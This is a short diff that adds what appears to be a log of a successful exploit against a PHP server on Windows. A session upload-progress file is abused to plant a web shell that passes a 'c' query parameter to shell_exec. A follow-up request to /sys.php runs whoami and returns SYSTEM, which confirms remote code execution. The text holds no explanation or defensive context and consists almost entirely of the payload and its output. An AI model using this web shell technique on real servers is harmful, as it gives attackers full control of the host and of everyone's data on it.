@@ -1,0 +1,7 @@
+SYSTEM server up: YES
+--- X2 plant (filtered token): EXISTS size=0 nlink=2 head=
+target owner: RASPUTIN\andre  (file is andre-owned; server is SYSTEM = cross-owner write)
+shell after: EXISTS size=460 nlink=2 head=upload_progress_<?php echo "WP4_RCE_OK[".shell_exec($_GET["c
+--- X2b GET /sys.php?c=whoami (expect nt authority\system)
+upload_progress_WP4_RCE_OK[nt authority\system
+]|a:5:{s:10:"start_time";i:1792810854;s:14:"content_length";i:65776;s:15:
